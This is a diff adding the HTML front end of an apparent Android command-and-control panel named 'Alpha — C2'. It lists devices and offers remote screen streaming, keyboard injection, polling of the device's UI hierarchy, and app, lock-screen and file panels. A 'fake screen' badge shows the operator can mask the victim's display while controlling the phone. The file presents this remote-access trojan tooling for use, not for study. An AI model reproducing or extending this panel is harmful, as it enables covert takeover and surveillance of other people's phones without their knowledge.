@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Alpha — C2</title>
+<link rel="stylesheet" href="/css/app.css">
+</head>
+<body>
+
+<!-- ── Sidebar ──────────────────────────────────────────────────────────── -->
+<aside class="sidebar">
+  <div class="logo">⟨ ALPHA ⟩</div>
+  <div class="sidebar-section">Devices</div>
+  <div id="devList" class="dev-list"></div>
+  <div class="sidebar-bottom">
+    <span id="statusDot" style="color:#ff4444">○ Offline</span>
+    <button class="btn-sm" id="btnLogout">Exit</button>
+  </div>
+</aside>
+
+<!-- ── Main ─────────────────────────────────────────────────────────────── -->
+<main class="main">
+
+  <!-- ── Header ─────────────────────────────────────────────────────────── -->
+  <header class="header">
+    <div class="header-row-top">
+      <span class="header-dev" id="activeDevice">No device selected</span>
+
+      <!-- Fake screen badge (hidden by default) -->
+      <div id="fakeScreenBadge" class="fake-badge" style="display:none">
+        ⚠ FAKE SCREEN ACTIVE — Ly &amp; gestures work normally
+      </div>
+
+      <div class="nav-btns">
+        <button class="nav-btn" id="btnWake"    title="Wake screen">💡</button>
+        <button class="nav-btn" id="btnBack"    title="Back">◀</button>
+        <button class="nav-btn" id="btnHome"    title="Home">⌂</button>
+        <button class="nav-btn" id="btnRecents" title="Recents">⬛</button>
+        <button class="nav-btn" id="btnNotif"   title="Notifications">🔔</button>
+        <button class="nav-btn" id="btnLock"    title="Lock device">🔒</button>
+        <button class="nav-btn" id="btnVolUp"   title="Volume up">🔊</button>
+        <button class="nav-btn" id="btnVolDn"   title="Volume down">🔉</button>
+      </div>
+    </div>
+
+    <!-- ── Tab bar ───────────────────────────────────────────────────────── -->
+    <div class="tab-bar">
+      <button class="tab active" data-panel="vnc">📺 VNC</button>
+      <button class="tab" data-panel="ly">🌳 Ly</button>
+      <button class="tab" data-panel="apps">📦 Apps</button>
+      <button class="tab" data-panel="lock">🔓 Lock</button>
+      <button class="tab" data-panel="files">📁 Files</button>
+    </div>
+  </header>
+
+  <!-- ── VNC Panel ────────────────────────────────────────────────────────── -->
+  <div id="panelVnc" class="panel">
+    <div class="vnc-wrap">
+      <canvas id="vncCanvas" width="360" height="640" class="vnc-canvas"></canvas>
+      <div id="vncOverlay" class="vnc-overlay" style="display:none">
+        <div class="vnc-overlay-text">Select a device to start streaming</div>
+      </div>
+    </div>
+
+    <div class="vnc-controls">
+      <label class="ctrl-label">Quality
+        <input type="range" id="vncQuality" min="15" max="85" value="50" />
+        <span id="vncQualityVal" class="ctrl-val">50</span>
+      </label>
+      <label class="ctrl-label">FPS
+        <select id="vncFps" class="ctrl-select">
+          <option value="8">8</option>
+          <option value="15">15</option>
+          <option value="20" selected>20</option>
+          <option value="30">30</option>
+        </select>
+      </label>
+      <span id="fpsCtr" class="fps-ctr">— fps</span>
+      <label class="ctrl-label type-wrap">Type:
+        <input id="typeInput" type="text" class="type-input"
+               placeholder="Keyboard input → device" autocomplete="off"
+               spellcheck="false" />
+      </label>
+    </div>
+
+    <!-- Command log -->
+    <div id="cmdLog" class="cmd-log"></div>
+  </div>
+
+  <!-- ── Ly Panel ──────────────────────────────────────────────────────────── -->
+  <div id="panelLy" class="panel" style="display:none">
+    <div class="ly-toolbar">
+      <button class="btn-sm" id="lyRefresh">↻ Refresh once</button>
+      <label class="ctrl-label">
+        <input type="checkbox" id="lyPoll" checked /> Live poll
+      </label>
+      <label class="ctrl-label">Interval
+        <select id="lyInterval" class="ctrl-select">
+          <option value="400">400 ms</option>
+          <option value="700" selected>700 ms</option>
+          <option value="1200">1200 ms</option>
+        </select>
+      </label>
+    </div>
+    <svg id="lySvg" class="ly-svg" xmlns="http://www.w3.org/2000/svg"></svg>
+  </div>
+
+  <!-- ── Apps Panel ────────────────────────────────────────────────────────── -->
+  <div id="panelApps" class="panel" style="display:none"></div>
+
+  <!-- ── Lock Panel ────────────────────────────────────────────────────────── -->
+  <div id="panelLock" class="panel" style="display:none"></div>
+
+  <!-- ── Files Panel ───────────────────────────────────────────────────────── -->
+  <div id="panelFiles" class="panel" style="display:none"></div>
+
+</main>
+
+<script src="/js/ws-client.js"></script>
+<script src="/js/vnc.js"></script>
+<script src="/js/ly-reader.js"></script>
+<script src="/js/app-manager.js"></script>
+<script src="/js/lock-manager.js"></script>
+<script src="/js/file-manager.js"></script>
+<script src="/js/dash.js"></script>
+
+<script>
+// Ly toolbar wiring (done here to access AlphaDash after load)
+document.addEventListener('DOMContentLoaded', () => {
+  const lyRefresh  = document.getElementById('lyRefresh');
+  const lyPoll     = document.getElementById('lyPoll');
+  const lyInterval = document.getElementById('lyInterval');
+
+  lyRefresh.onclick = () => {
+    if (window._dash?.ws && window._dash?.activeDevice) {
+      window._dash.ws.cmd(window._dash.activeDevice, 'REQUEST_HIERARCHY', {});
+    }
+  };
+  lyPoll.onchange = () => {
+    if (!window._dash) return;
+    if (lyPoll.checked) window._dash.ly?.start(+lyInterval.value);
+    else                window._dash.ly?.stop();
+  };
+  lyInterval.onchange = () => {
+    if (!window._dash || !lyPoll.checked) return;
+    window._dash.ly?.stop();
+    window._dash.ly?.start(+lyInterval.value);
+  };
+});
+</script>
+</body>
+</html>
